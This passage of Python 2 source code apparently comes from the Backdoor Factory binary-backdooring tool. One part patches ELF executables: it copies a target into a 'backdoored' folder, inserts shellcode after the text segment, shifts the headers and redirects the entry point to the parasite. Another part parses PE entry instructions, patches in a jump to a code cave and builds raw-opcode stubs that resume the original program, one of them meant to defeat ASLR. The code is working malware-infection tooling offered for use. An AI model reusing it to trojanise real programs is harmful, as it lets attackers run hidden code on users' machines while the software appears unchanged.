                self.sec_hdr[i]['sh_addralign'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.sec_hdr[i]['sh_entsize'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
        #bin.seek(self.sec_hdr'][self.e_shstrndx']]['sh_offset'], 0)
        self.set_section_name()
        if self.e_type != 0x2:
            print "[!] Only supporting executable elf e_types, things may get weird."
    
    
    def output_options(self):
        """
        Output file check.
        """
        if not self.OUTPUT:
            self.OUTPUT = os.path.basename(self.FILE)

    
    def patch_elf(self):
        '''
        Circa 1998: http://vxheavens.com/lib/vsc01.html  <--Thanks to elfmaster
        6. Increase p_shoff by PAGE_SIZE in the ELF header
        7. Patch the insertion code (parasite) to jump to the entry point (original)
        1. Locate the text segment program header
            -Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
            -Increase p_filesz by account for the new code (parasite)
            -Increase p_memsz to account for the new code (parasite)
        2. For each phdr who's segment is after the insertion (text segment)
            -increase p_offset by PAGE_SIZE
        3. For the last shdr in the text segment
            -increase sh_len by the parasite length
        4. For each shdr who's section resides after the insertion
            -Increase sh_offset by PAGE_SIZE
        5. Physically insert the new code (parasite) and pad to PAGE_SIZE, 
            into the file - text segment p_offset + p_filesz (original)
        '''
        self.support_check()
        if self.supported is False:
            "ELF Binary not supported"
            sys.exit(-1)
        
        self.output_options()

        if not os.path.exists("backdoored"):
            os.makedirs("backdoored")
        os_name = os.name
        if os_name == 'nt':
            self.backdoorfile = "backdoored\\" + self.OUTPUT
        else:
            self.backdoorfile = "backdoored/" +  self.OUTPUT

        shutil.copy2(self.FILE, self.backdoorfile)

        self.gather_file_info()
        self.set_shells()
        self.bin_file = open(self.backdoorfile, "r+b")
        
        shellcode = self.shellcode
        
        newBuffer = len(shellcode)
        
        self.bin_file.seek(24, 0)
    
        sh_addr = 0x0
        offsetHold = 0x0
        sizeOfSegment = 0x0 
        shellcode_vaddr = 0x0
        headerTracker = 0x0
        PAGE_SIZE = 4096
        #find range of the first PT_LOAD section
        for header, values in self.prog_hdr.iteritems():
            #print 'program header', header, values
            if values['p_flags'] == 0x5 and values['p_type'] == 0x1:
                #print "Found text segment"
                shellcode_vaddr = values['p_vaddr'] + values['p_filesz']
                beginOfSegment = values['p_vaddr']
                oldentry = self.e_entry
                sizeOfNewSegment = values['p_memsz'] + newBuffer
                LOCofNewSegment = values['p_filesz'] + newBuffer
                headerTracker = header
                newOffset = values['p_offset'] + values['p_filesz']
        
        #SPLIT THE FILE
        self.bin_file.seek(0)
        file_1st_part = self.bin_file.read(newOffset)
        #print file_1st_part.encode('hex')
        newSectionOffset = self.bin_file.tell()
        file_2nd_part = self.bin_file.read()

        self.bin_file.close()
        #print "Reopen file for adjustments"
        self.bin_file = open(self.backdoorfile, "w+b")
        self.bin_file.write(file_1st_part)
        self.bin_file.write(shellcode)
        self.bin_file.write("\x00" * (PAGE_SIZE - len(shellcode)))
        self.bin_file.write(file_2nd_part)
        if self.EI_CLASS == 0x01:
            #32 bit FILE
            #update section header table
            print "[*] Patching x32 Binary"
            self.bin_file.seek(24, 0)
            self.bin_file.seek(8, 1)
            self.bin_file.write(struct.pack(self.endian + "I", self.e_shoff + PAGE_SIZE))
            self.bin_file.seek(self.e_shoff + PAGE_SIZE, 0)
            for i in range(self.e_shnum):
                #print "i", i, self.sec_hdr[i]['sh_offset'], newOffset
                if self.sec_hdr[i]['sh_offset'] >= newOffset:
                    #print "Adding page size"
                    self.bin_file.seek(16, 1)
                    self.bin_file.write(struct.pack(self.endian + "I", self.sec_hdr[i]['sh_offset'] + PAGE_SIZE))
                    self.bin_file.seek(20, 1)
                elif self.sec_hdr[i]['sh_size'] + self.sec_hdr[i]['sh_addr'] == shellcode_vaddr:
                    #print "adding newBuffer size"
                    self.bin_file.seek(20, 1)
                    self.bin_file.write(struct.pack(self.endian + "I", self.sec_hdr[i]['sh_size'] + newBuffer))
                    self.bin_file.seek(16, 1)
                else:
                    self.bin_file.seek(40,1)
            #update the pointer to the section header table
            after_textSegment = False
            self.bin_file.seek(self.e_phoff,0)
            for i in range(self.e_phnum):
                #print "header range i", i
                #print "shellcode_vaddr", hex(self.prog_hdr[i]['p_vaddr']), hex(shellcode_vaddr)
                if i == headerTracker:
                    #print "Found Text Segment again"
                    after_textSegment = True
                    self.bin_file.seek(16, 1)
                    self.bin_file.write(struct.pack(self.endian + "I", self.prog_hdr[i]['p_filesz'] + newBuffer))
                    self.bin_file.write(struct.pack(self.endian + "I", self.prog_hdr[i]['p_memsz'] + newBuffer))
                    self.bin_file.seek(8, 1)
                elif after_textSegment is True:
                    #print "Increasing headers after the addition"
                    self.bin_file.seek(4, 1)
                    self.bin_file.write(struct.pack(self.endian + "I", self.prog_hdr[i]['p_offset'] + PAGE_SIZE))
                    self.bin_file.seek(24, 1)
                else:
                    self.bin_file.seek(32,1)

            self.bin_file.seek(self.e_entryLocOnDisk, 0)
            self.bin_file.write(struct.pack(self.endian + "I", shellcode_vaddr))
           
            self.JMPtoCodeAddress = shellcode_vaddr - self.e_entry -5
           
        else:
            #64 bit FILE
            print "[*] Patching x64 Binary"
            self.bin_file.seek(24, 0)
            self.bin_file.seek(16, 1)
            self.bin_file.write(struct.pack(self.endian + "I", self.e_shoff + PAGE_SIZE))
            self.bin_file.seek(self.e_shoff + PAGE_SIZE, 0)
            for i in range(self.e_shnum):
                #print "i", i, self.sec_hdr[i]['sh_offset'], newOffset
                if self.sec_hdr[i]['sh_offset'] >= newOffset:
                    #print "Adding page size"
                    self.bin_file.seek(24, 1)
                    self.bin_file.write(struct.pack(self.endian + "Q", self.sec_hdr[i]['sh_offset'] + PAGE_SIZE))
                    self.bin_file.seek(32, 1)
                elif self.sec_hdr[i]['sh_size'] + self.sec_hdr[i]['sh_addr'] == shellcode_vaddr:
                    #print "adding newBuffer size"
                    self.bin_file.seek(32, 1)
                    self.bin_file.write(struct.pack(self.endian + "Q", self.sec_hdr[i]['sh_size'] + newBuffer))
                    self.bin_file.seek(24, 1)
                else:
                    self.bin_file.seek(64,1)
            #update the pointer to the section header table
            after_textSegment = False
            self.bin_file.seek(self.e_phoff,0)
            for i in range(self.e_phnum):
                #print "header range i", i
                #print "shellcode_vaddr", hex(self.prog_hdr[i]['p_vaddr']), hex(shellcode_vaddr)
                if i == headerTracker:
                    #print "Found Text Segment again"
                    after_textSegment = True
                    self.bin_file.seek(32, 1)
                    self.bin_file.write(struct.pack(self.endian + "Q", self.prog_hdr[i]['p_filesz'] + newBuffer))
                    self.bin_file.write(struct.pack(self.endian + "Q", self.prog_hdr[i]['p_memsz'] + newBuffer))
                    self.bin_file.seek(8, 1)
                elif after_textSegment is True:
                    #print "Increasing headers after the addition"
                    self.bin_file.seek(8, 1)
                    self.bin_file.write(struct.pack(self.endian + "Q", self.prog_hdr[i]['p_offset'] + PAGE_SIZE))
                    self.bin_file.seek(40, 1)
                else:
                    self.bin_file.seek(56,1)

            self.bin_file.seek(self.e_entryLocOnDisk, 0)
            self.bin_file.write(struct.pack(self.endian + "Q", shellcode_vaddr))
           
            self.JMPtoCodeAddress = shellcode_vaddr - self.e_entry -5    

        self.bin_file.close()
        print "[!] Patching Complete"
        return True

# END elfbin clas

########NEW FILE########
__FILENAME__ = intelCore
'''
 
    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
    
    Copyright (C) 2013,2014, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.


'''


import struct
import random
from binascii import unhexlify

#Might make this a class
class intelCore():

    nops = [0x90, 0x3690, 0x6490, 0x6590, 0x6690, 0x6790]

    jump_codes = [int('0xe9', 16), int('0xeb', 16), int('0xea', 16)]

    opcode32 = {'0x0100': 2, '0x0101': 2, '0x0102': 2, '0x0103': 2,
                '0x0104': 3, '0x0105': 6, '0x0106': 2, '0x0107': 2,
                '0x0108': 2, '0x0109': 2, '0x010a': 2, '0x010b': 2,
                '0x010c': 3, '0x010d': 6, '0x010e': 2, '0x010f': 2,
                '0x0110': 2, '0x0111': 2, '0x0112': 2, '0x0113': 2,
                '0x0114': 3, '0x0115': 6, '0x0116': 2, '0x0117': 2,
                '0x0118': 2, '0x0119': 2, '0x011a': 2, '0x011b': 2,
                '0x011c': 3, '0x011d': 6, '0x011e': 2, '0x011f': 2,
                '0x0120': 2, '0x0121': 2, '0x0122': 2, '0x0123': 2,
                '0x0124': 3, '0x0125': 6, '0x0126': 2, '0x0127': 2,
                '0x0128': 2, '0x0129': 2, '0x012a': 2, '0x012b': 2,
                '0x012c': 3, '0x012d': 6, '0x012e': 2, '0x012f': 2,
                '0x0130': 2, '0x0131': 2, '0x0132': 2, '0x0133': 2,
                '0x0134': 3, '0x0135': 6, '0x0136': 2, '0x0137': 2,
                '0x0138': 2, '0x0139': 2, '0x013A': 2, '0x013b': 2,
                '0x013c': 3, '0x013d': 6, '0x013e': 2, '0x013f': 2,
                '0x0140': 2, '0x0141': 3, '0x0142': 3, '0x0143': 3,
                '0x0144': 4, '0x0145': 3, '0x0146': 3, '0x0147': 3,
                '0x0148': 3, '0x0149': 3, '0x014a': 3, '0x014b': 3,
                '0x014c': 4, '0x014d': 3, '0x014e': 3, '0x014f': 3,
                '0x0150': 3, '0x0151': 3, '0x0152': 3, '0x0153': 3,
                '0x0154': 4, '0x0155': 3, '0x0156': 3, '0x0157': 3,
                '0x0158': 3, '0x0159': 3, '0x015a': 3, '0x015b': 3,
                '0x015c': 4, '0x015d': 3, '0x015e': 3, '0x015f': 3,
                '0x0160': 3, '0x0161': 3, '0x0162': 3, '0x0163': 3,
                '0x0164': 4, '0x0165': 3, '0x0166': 3, '0x0167': 3,
                '0x0168': 3, '0x0169': 3, '0x016a': 3, '0x016b': 3,
                '0x016c': 4, '0x016d': 3, '0x016e': 3, '0x016f': 3,
                '0x0170': 3, '0x0171': 3, '0x0172': 3, '0x0173': 3,
                '0x0174': 4, '0x0175': 3, '0x0176': 3, '0x0177': 3,
                '0x0178': 3, '0x0179': 3, '0x017a': 3, '0x017b': 3,
                '0x017c': 4, '0x017d': 3, '0x017e': 3, '0x017f': 3,
                '0x0180': 6, '0x0181': 6, '0x0182': 6, '0x0183': 6,
                '0x0184': 7, '0x0185': 6, '0x0186': 6, '0x0187': 6,
                '0x0188': 6, '0x0189': 6, '0x018a': 6, '0x0184': 6,
                '0x018c': 7, '0x018d': 6, '0x018e': 6, '0x018f': 6,
                '0x0190': 6, '0x0191': 6, '0x0192': 6, '0x0193': 6,
                '0x0194': 7, '0x0195': 6, '0x0196': 6, '0x0197': 6,
                '0x0198': 6, '0x0199': 6, '0x019a': 6, '0x019b': 6,
                '0x019c': 7, '0x019d': 6, '0x019e': 6, '0x019f': 6,
                '0x01a0': 6, '0x01a1': 6, '0x01a2': 6, '0x01a3': 6,
                '0x01a4': 7, '0x01a5': 6, '0x01a6': 6, '0x01a7': 6,
                '0x01a8': 6, '0x01a9': 6, '0x01aa': 6, '0x01ab': 6,
                '0x01ac': 7, '0x01ad': 6, '0x01ae': 6, '0x01af': 6,
                '0x01b0': 6, '0x01b1': 6, '0x01b2': 6, '0x01b3': 6,
                '0x01b4': 7, '0x01b5': 6, '0x01b6': 6, '0x01b7': 6,
                '0x01b8': 6, '0x01b9': 6, '0x01ba': 6, '0x01bb': 6,
                '0x01bc': 7, '0x01bd': 6, '0x01be': 6, '0x01bf': 6,
                '0x01c0': 2, '0x01c1': 2, '0x01c2': 2, '0x01c3': 2,
                '0x01c4': 2, '0x01c5': 2, '0x01c6': 2, '0x01c7': 2,
                '0x01c8': 2, '0x01c9': 2, '0x01ca': 2, '0x01cb': 2,
                '0x01cc': 2, '0x01cd': 2, '0x01ce': 2, '0x01cf': 2,
                '0x0f34': 2, '0x31ed': 2, '0x89e1': 2, '0x83e4': 3,
                '0x2b': 2,
                '40': 1, '0x41': 1, '0x42': 1, '0x43': 1,
                '0x44': 1, '0x45': 1, '0x46': 1, '0x47': 1,
                '0x48': 1, '0x49': 1, '0x4a': 1, '0x4b': 1,
                '0x4c': 1, '0x4d': 1, '0x4e': 1, '0x4f': 1,
                '0x50': 1, '0x51': 1, '0x52': 1, '0x53': 1,
                '0x54': 1, '0x55': 1, '0x56': 1, '0x57': 1,
                '0x58': 1, '0x59': 1, '0x5a': 1, '0x5b': 1,
                '0x5c': 1, '0x5d': 1, '0x5e': 1, '0x5f': 1,
                '0x60': 1, '0x61': 1, '0x6201': 2, '0x6202': 2,
                '0x6203': 2, '0x66': 1, '0x623a': 2,
                '0x6204': 3, '0x6205': 6, '0x6206': 2, '0x6207': 2,
                '0x6208': 2, '0x6209': 2, '0x620a': 2, '0x620b': 2,
                '0x620c': 3, '0x64a0': 6, '0x64a1': 6, '0x64a2': 6,
                '0x64a3': 6, '0x64a4': 2, '0x64a5': 2, '0x64a6': 2,
                '0x64a7': 2, '0x64a8': 3, '0x64a9': 6, '0x64aa': 2,
                '0x64ab': 2, '0x64ac': 2, '0x64ad': 2, '0x64ae': 2,
                '0x64af': 2,
                '0x6a': 2,
                '0x70': 2, '0x71': 2, '0x72': 2, '0x73': 2,
                '0x74': 2, '0x75': 2, '0x76': 2, '0x77': 2,
                '0x78': 2,
                '0x79': 2, '0x8001': 3, '0x8002': 3,
                '0x8b45': 3, '0x8945': 3, '0x837d': 4, '0x8be5': 2,
                '0x880a': 2, '0x8bc7': 2, '0x8bf4': 2, '0x893e': 2,
                '0x8965': 3, '0xff15': 6, '0x8b4e': 3, '0x8b46': 3,
                '0x8b76': 3, '0x8915': 6, '0x8b56': 3, '0x83f9': 3,
                '0x81ec': 6, '0x837d': 4, '0x8b5d': 3, '0x8b75': 3,
                '0x8b7d': 3, '0x83fe': 3, '0x8bff': 2, '0x83c4': 3,
                '0x83ec': 3, '0x8bec': 2, '0x8bf6': 2, '0x85c0': 2,
                '0x33c0': 2, '0x33c9': 2, '0x89e5': 2, '0x89ec': 3,
                '0x9c': 1,
                '0xc70424': 7, '0xc9': 1, '0xff25': 6,
                '0xff1410': 3, '0xff1490': 3, '0xff1450': 3,
                '0xe8': 5, '0x68': 5, '0xe9': 5,
                '0xbf': 5, '0xbe': 5,
                '0xcc': 1, '0xcd': 2,
                '0xffd3': 2,
                '0x33f6': 2,
                '0x895c24': 4, '0x8da424': 7, '0x8d4424': 4,
                '0xa1': 5, '0xa3': 5, '0xc3': 1,
                '0xeb': 2, '0xea': 7,
                '0xb9': 5, '0xba': 5, '0xbb': 5, '0xb8': 5, 
                }

    opcode64 = {'0x4150':2,'0x4151': 2, '0x4152': 2, '0x4153': 2, '0x4154': 2,
                '0x4155': 2,'0x4156': 2, '0x4157': 2,
                '0x4881ec': 7,
                '0x4883c0': 4, '0x4883c1': 4, '0x4883c2': 4, '0x4883c3': 4,
                '0x4883c4': 4, '0x4883c5': 4, '0x4883c6': 4, '0x4883c7': 4,
                '0x4883c8': 4, '0x4883c9': 4, '0x4883ca': 4, '0x4883cb': 4,
                '0x4883cc': 4, '0x4883cd': 4, '0x4883ce': 4, '0x4883cf': 4,
                '0x4883d0': 4, '0x4883d1': 4, '0x4883d2': 4, '0x4883d3': 4,
                '0x4883d4': 4, '0x4883d5': 4, '0x4883d6': 4, '0x4883d7': 4,
                '0x4883d8': 4, '0x4883d9': 4, '0x4883da': 4, '0x4883db': 4,
                '0x4883dc': 4, '0x4883dd': 4, '0x4883de': 4, '0x4883df': 4,
                '0x4883e0': 4, '0x4883e1': 4, '0x4883e2': 4, '0x4883e3': 4,
                '0x4883e4': 4, '0x4883e5': 4, '0x4883e6': 4, '0x4883e7': 4,
                '0x4883e8': 4, '0x4883e9': 4, '0x4883ea': 4, '0x4883eb': 4,
                '0x4883ec': 4, '0x4883ed': 4, '0x4883ee': 4, '0x4883ef': 4,
                '0x4883f0': 4, '0x4883f1': 4, '0x4883f2': 4, '0x4883f3': 4,
                '0x4883f4': 4, '0x4883f5': 4, '0x4883f6': 4, '0x4883f7': 4,
                '0x4883f8': 4, '0x4883f9': 4, '0x4883fa': 4, '0x4883fb': 4,
                '0x4883fc': 4, '0x4883fd': 4, '0x4883fe': 4, '0x4883ff': 4,
                '0x488bc0': 3, '0x488bc1': 3, '0x488bc2': 3, '0x488bc3': 3,
                '0x488bc4': 3, '0x488bc5': 3, '0x488bc6': 3, '0x488bc7': 3,
                '0x488bc8': 3, '0x488bc9': 3, '0x488bca': 3, '0x488bcb': 3,
                '0x488bcc': 3, '0x488bcd': 3, '0x488bce': 3, '0x488bcf': 3,
                '0x488bd0': 3, '0x488bd1': 3, '0x488bd2': 3, '0x488bd3': 3,
                '0x488bd4': 3, '0x488bd5': 3, '0x488bd6': 3, '0x488bd7': 3,
                '0x488bd8': 3, '0x488bd9': 3, '0x488bda': 3, '0x488bdb': 3,
                '0x488bdc': 3, '0x488bdd': 3, '0x488bde': 3, '0x488bdf': 3,
                '0x488be0': 3, '0x488be1': 3, '0x488be2': 3, '0x488be3': 3,
                '0x488be4': 3, '0x488be5': 3, '0x488be6': 3, '0x488be7': 3,
                '0x488be8': 3, '0x488be9': 3, '0x488bea': 3, '0x488beb': 3,
                '0x488bec': 3, '0x488bed': 3, '0x488bee': 3, '0x488bef': 3,
                '0x488bf0': 3, '0x488bf1': 3, '0x488bf2': 3, '0x488bf3': 3,
                '0x488bf4': 3, '0x488bf5': 3, '0x488bf6': 3, '0x488bf7': 3,
                '0x488bf8': 3, '0x488bf9': 3, '0x488bfa': 3, '0x488bfb': 3,
                '0x488bfc': 3, '0x488bfd': 3, '0x488bfe': 3, '0x488bff': 3,
                '0x48895c': 5, '0x4989d1': 3,
                }

    def __init__(self, flItms, file_handle, VERBOSE):
        self.f = file_handle
        self.flItms = flItms
        self.VERBOSE = VERBOSE


    def opcode_return(self, OpCode, instr_length):
        _, OpCode = hex(OpCode).split('0x')
        OpCode = unhexlify(OpCode)
        return OpCode

    def ones_compliment(self):
        """
        Function for finding two random 4 byte numbers that make
        a 'ones compliment'
        """
        compliment_you = random.randint(1, 4228250625)
        compliment_me = int('0xFFFFFFFF', 16) - compliment_you
        if self.VERBOSE is True:
            print "First ones compliment:", hex(compliment_you)
            print "2nd ones compliment:", hex(compliment_me)
            print "'AND' the compliments (0): ", compliment_you & compliment_me
        self.compliment_you = struct.pack('<I', compliment_you)
        self.compliment_me = struct.pack('<I', compliment_me)
        
    def assembly_entry(self):
        if hex(self.CurrInstr) in self.opcode64:
            opcode_length = self.opcode64[hex(self.CurrInstr)]
        elif hex(self.CurrInstr) in self.opcode32:
            opcode_length = self.opcode32[hex(self.CurrInstr)]
        if self.instr_length == 7:
            self.InstrSets[self.CurrInstr] = (struct.unpack('<Q', self.f.read(7) + '\x00')[0])
        if self.instr_length == 6:
            self.InstrSets[self.CurrInstr] = (struct.unpack('<Q', self.f.read(6) + '\x00\x00')[0])
        if self.instr_length == 5:
            self.InstrSets[self.CurrInstr] = (struct.unpack('<Q', self.f.read(5) +
                                              '\x00\x00\x00')[0])
        if self.instr_length == 4:
            self.InstrSets[self.CurrInstr] = struct.unpack('<I', self.f.read(4))[0]
        if self.instr_length == 3:
            self.InstrSets[self.CurrInstr] = struct.unpack('<I', self.f.read(3) + '\x00')[0]
        if self.instr_length == 2:
            self.InstrSets[self.CurrInstr] = struct.unpack('<H', self.f.read(2))[0]
        if self.instr_length == 1:
            self.InstrSets[self.CurrInstr] = struct.unpack('<B', self.f.read(1))[0]
        if self.instr_length == 0:
            self.InstrSets[self.CurrInstr] = 0
        self.flItms['VrtStrtngPnt'] = (self.flItms['VrtStrtngPnt'] +
                                       opcode_length)
        CallValue = (self.InstrSets[self.CurrInstr] +
                     self.flItms['VrtStrtngPnt'] +
                     opcode_length)
        self.flItms['ImpList'].append([self.CurrRVA, self.InstrSets, CallValue,
                                       self.flItms['VrtStrtngPnt'],
                                       self.instr_length])
        self.count += opcode_length
        return self.InstrSets, self.flItms, self.count

    def pe32_entry_instr(self):
        """
        This fuction returns a list called self.flItms['ImpList'] that tracks the first
        couple instructions for reassembly after the shellcode executes.
        If there are pe entry instructions that are not mapped here,
        please send me the first 15 bytes (3 to 4 instructions on average)
        for the executable entry point once loaded in memory.  If you are
        familiar with olly/immunity it is the first couple instructions
        when the program is first loaded.
        """
        print "[*] Reading win32 entry instructions"
        self.f.seek(self.flItms['LocOfEntryinCode'])
        self.count = 0
        loop_count = 0
        self.flItms['ImpList'] = []
        while True:
            self.InstrSets = {}
            for i in range(1, 5):
                self.f.seek(self.flItms['LocOfEntryinCode'] + self.count)
                self.CurrRVA = self.flItms['VrtStrtngPnt'] + self.count
                if i == 1:
                    self.CurrInstr = struct.unpack('!B', self.f.read(i))[0]
                elif i == 2:
                    self.CurrInstr = struct.unpack('!H', self.f.read(i))[0]
                elif i == 3:
                    self.CurrInstr = struct.unpack('!I', '\x00' + self.f.read(3))[0]
                elif i == 4:
                    self.CurrInstr = struct.unpack('!I', self.f.read(i))[0]
                if hex(self.CurrInstr) in self.opcode32:
                    self.instr_length = self.opcode32[hex(self.CurrInstr)] - i
                    self.InstrSets, self.flItms, self.count = self.assembly_entry()
                    break

            if self.count >= 6 or self.count % 5 == 0 and self.count != 0:
                break

            loop_count += 1
            if loop_count >= 10:
                print "This program's initial opCodes are not planned for"
                print "Please contact the developer."
                self.flItms['supported'] = False
                break
        self.flItms['count_bytes'] = self.count
        return self.flItms, self.count

    def pe64_entry_instr(self):
        """
        For x64 files
        """

        print "[*] Reading win64 entry instructions"
        self.f.seek(self.flItms['LocOfEntryinCode'])
        self.count = 0
        loop_count = 0
        self.flItms['ImpList'] = []
        check64 = 0
        while True:
            #need to self.count offset from vrtstartingpoint
            self.InstrSets = {}
            if check64 >= 4:
                check32 = True
            else:
                check32 = False
            for i in range(1, 5):
                self.f.seek(self.flItms['LocOfEntryinCode'] + self.count)
                self.CurrRVA = self.flItms['VrtStrtngPnt'] + self.count
                if i == 1:
                    self.CurrInstr = struct.unpack('!B', self.f.read(i))[0]
                elif i == 2:
                    self.CurrInstr = struct.unpack('!H', self.f.read(i))[0]
                elif i == 3:
                    self.CurrInstr = struct.unpack('!I', '\x00' + self.f.read(3))[0]
                elif i == 4:
                    self.CurrInstr = struct.unpack('!I', self.f.read(i))[0]
                if check32 is False:
                    if hex(self.CurrInstr) in self.opcode64:
                        self.instr_length = self.opcode64[hex(self.CurrInstr)] - i
                        self.InstrSets, self.flItms, self.count = self.assembly_entry()
                        check64 = 0
                        break
                    else:
                        check64 += 1
                elif check32 is True:
                    if hex(self.CurrInstr) in self.opcode32:
                        self.instr_length = self.opcode32[hex(self.CurrInstr)] - i
                        self.InstrSets, self.flItms, self.count = self.assembly_entry()
                        check64 = 0
                        break


            if self.count >= 6 or self.count % 5 == 0 and self.count != 0:
                break

            loop_count += 1
            if loop_count >= 10:
                print "This program's initial opCodes are not planned for"
                print "Please contact the developer."
                self.flItms['supported'] = False
                break
        self.flItms['count_bytes'] = self.count
        return self.flItms, self.count

    def patch_initial_instructions(self):
        """
        This function takes the flItms dict and patches the
        executable entry point to jump to the first code cave.
        """
        print "[*] Patching initial entry instructions"
        self.f.seek(self.flItms['LocOfEntryinCode'])
        #This is the JMP command in the beginning of the
        #code entry point that jumps to the codecave
        self.f.write(struct.pack('=B', int('E9', 16)))
        if self.flItms['JMPtoCodeAddress'] < 0:
            self.f.write(struct.pack('<I', 0xffffffff + self.flItms['JMPtoCodeAddress']))
        else: 
            self.f.write(struct.pack('<I', self.flItms['JMPtoCodeAddress']))
        #align the stack if the first OpCode+instruction is less
        #than 5 bytes fill with      to align everything. Not a for loop.
        FrstOpCode = self.flItms['ImpList'][0][1].keys()[0]

        if hex(FrstOpCode) in self.opcode64:
            opcode_length = self.opcode64[hex(FrstOpCode)]
        elif hex(FrstOpCode) in self.opcode32:
            opcode_length = self.opcode32[hex(FrstOpCode)]
        if opcode_length == 7:
            if self.flItms['count_bytes'] % 5 != 0 and self.flItms['count_bytes'] < 5:
                self.f.write(struct.pack('=B', int('90', 16)))
        if opcode_length == 6:
            if self.flItms['count_bytes'] % 5 != 0 and self.flItms['count_bytes'] < 5:
                self.f.write(struct.pack('=BB', int('90', 16), int('90', 16)))
        if opcode_length == 5:
            if self.flItms['count_bytes'] % 5 != 0 and self.flItms['count_bytes'] < 5:
                #self.f.write(struct.pack('=BB', int('90', 16), int('90', 16)))
                pass
        if opcode_length == 4:
            if self.flItms['count_bytes'] % 5 != 0 and self.flItms['count_bytes'] < 5:
                self.f.write(struct.pack('=BB', int('90', 16)))
        if opcode_length == 3:
            if self.flItms['count_bytes'] % 5 != 0 and self.flItms['count_bytes'] < 5:
                self.f.write(struct.pack('=B', int('90', 16)))
        if opcode_length == 2:
            if self.flItms['count_bytes'] % 5 != 0 and self.flItms['count_bytes'] < 5:
                self.f.write(struct.pack('=BB', int('90', 16), int('90', 16)))
        if opcode_length == 1:
            if self.flItms['count_bytes'] % 5 != 0 and self.flItms['count_bytes'] < 5:
                self.f.write(struct.pack('=BBB', int('90', 16),
                                    int('90', 16),
                                    int('90', 16)))


    def resume_execution_64(self):
        """
        For x64 exes...
        """
        verbose = False
        print "[*] Creating win64 resume execution stub"
        resumeExe = ''
        total_opcode_len = 0
        for item in self.flItms['ImpList']:
            OpCode_address = item[0]
            OpCode = item[1].keys()[0]
            instruction = item[1].values()[0]
            ImpValue = item[2]
            instr_length = item[4]
            if hex(OpCode) in self.opcode64:
                total_opcode_len += self.opcode64[hex(OpCode)]
            elif hex(OpCode) in self.opcode32:
                total_opcode_len += self.opcode32[hex(OpCode)]
            else:
                "Warning OpCode not found"
            if verbose is True:
                if instruction:
                    print 'instruction', hex(instruction)
                else:
                    print "single opcode, no instruction"

            self.ones_compliment()

            if OpCode == int('e8', 16):  # Call instruction
                resumeExe += "\x48\x89\xd0"  # mov rad,rdx
                resumeExe += "\x48\x83\xc0"  # add rax,xxx
                resumeExe += struct.pack("<B", total_opcode_len)  # length from vrtstartingpoint after call
                resumeExe += "\x50"  # push rax
                if instruction <= 4294967295:
                    resumeExe += "\x48\xc7\xc1"  # mov rcx, 4 bytes
                    resumeExe += struct.pack("<I", instruction)
                elif instruction > 4294967295:
                    resumeExe += "\x48\xb9"  # mov rcx, 8 bytes
                    resumeExe += struct.pack("<Q", instruction)
                else:
                    print "So close.."
                    print ("Contact the dev with the exe and instruction=",
                           instruction)
                    sys.exit()
                resumeExe += "\x48\x01\xc8"  # add rax,rcx
                #-----
                resumeExe += "\x50"
                resumeExe += "\x48\x31\xc9"  # xor rcx,rcx
                resumeExe += "\x48\x89\xf0"  # mov rax, rsi
                resumeExe += "\x48\x81\xe6"  # and rsi, XXXX
                resumeExe += self.compliment_you
                resumeExe += "\x48\x81\xe6"  # and rsi, XXXX
                resumeExe += self.compliment_me
                resumeExe += "\xc3"
                ReturnTrackingAddress = item[3]
                return ReturnTrackingAddress, resumeExe

            elif OpCode in self.jump_codes:
                #Let's beat ASLR
                resumeExe += "\xb8"
                aprox_loc_wo_alsr = (self.flItms['VrtStrtngPnt'] +
                                     self.flItms['JMPtoCodeAddress'] +
                                     len(shellcode) + len(resumeExe) +
                                     200 + self.flItms['buffer'])
                resumeExe += struct.pack("<I", aprox_loc_wo_alsr)
                resumeExe += struct.pack('=B', int('E8', 16))  # call
                resumeExe += "\x00" * 4
                # POP ECX to find location
                resumeExe += struct.pack('=B', int('59', 16))
                resumeExe += "\x2b\xc1"  # sub eax,ecx
                resumeExe += "\x3d\x00\x05\x00\x00"  # cmp eax,500
                resumeExe += "\x77\x0b"  # JA (14)
                resumeExe += "\x83\xC1\x16"
                resumeExe += "\x51"
                resumeExe += "\xb8"  # Mov EAX ..
                if OpCode is int('ea', 16):  # jmp far
                    resumeExe += struct.pack('<BBBBBB', ImpValue)
                elif ImpValue > 429467295:
                    resumeExe += struct.pack('<I', abs(ImpValue - 0xffffffff + 2))
                else:
                    resumeExe += struct.pack('<I', ImpValue)  # Add+ EAX, CallValue
                resumeExe += "\x50\xc3"
                resumeExe += "\x8b\xf0"
                resumeExe += "\x8b\xc2"
                resumeExe += "\xb9"
                resumeExe += struct.pack('<I', self.flItms['VrtStrtngPnt'])
                resumeExe += "\x2b\xc1"
                resumeExe += "\x05"
                if OpCode is int('ea', 16):  # jmp far
                    resumeExe += struct.pack('<BBBBBB', ImpValue)
                elif ImpValue > 429467295:
                    resumeExe += struct.pack('<I', abs(ImpValue - 0xffffffff + 2))
                else:
                    resumeExe += struct.pack('<I', ImpValue - 5)
                resumeExe += "\x50"
                resumeExe += "\x33\xc9"
                resumeExe += "\x8b\xc6"
                resumeExe += "\x81\xe6"
                resumeExe += self.compliment_you
                resumeExe += "\x81\xe6"
                resumeExe += self.compliment_me
                resumeExe += "\xc3"
                ReturnTrackingAddress = item[3]
                return ReturnTrackingAddress, resumeExe

            elif instr_length == 7:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<BBBBBBB", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 6:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<BBBBBB", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 5:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<BBBBB", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 4:
